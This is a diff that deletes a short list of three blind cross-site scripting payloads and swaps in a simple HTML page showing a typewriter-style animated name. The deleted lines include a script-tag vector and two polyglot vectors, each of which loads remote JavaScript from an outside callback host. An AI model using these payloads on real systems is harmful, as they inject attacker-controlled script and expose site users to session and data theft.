@@ -1,14 +1,61 @@
-Blind XSS Custom Vector - Default
-Simple, good for known PoCs.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Name</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
 
-<Script /Src=https://X55.is?1=808></Script>
+        #animatedName {
+            font-family: 'Arial', sans-serif;
+            font-size: 2em;
+            color: #3498db;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            border-right: 3px solid #3498db;
+            animation: typeWriter 1s steps(20) 1s forwards, blinkCursor 0.5s step-end infinite alternate;
+        }
 
-Blind XSS Custom Vector - Short Polyglot (HTML & JS Main Cases)
-Balanced, good size and power.
+        @keyframes typeWriter {
+            from {
+                width: 0;
+            }
+            to {
+                width: 100%;
+            }
+        }
 
-'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=808/.source))//>
+        @keyframes blinkCursor {
+            to {
+                border-right-color: transparent;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="animatedName">Emad Shanab</div>
 
-Blind XSS Custom Vector - Full Polyglot (20+ XSS Cases)
-Best, for non-restricted inputs.
+    <script>
+        // You can customize the name or add more animations if needed
+        // For example, you can change the animation duration or delay
 
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=808/.source))}//\76-->
+        // Wait for the DOM to be ready
+        document.addEventListener('DOMContentLoaded', function() {
+            // Your name
+            var name = "Your Name";
+
+            // Set the innerHTML of the animatedName div to the name
+            document.getElementById('animatedName').innerHTML = name;
+        });
+    </script>
+</body>
+</html>
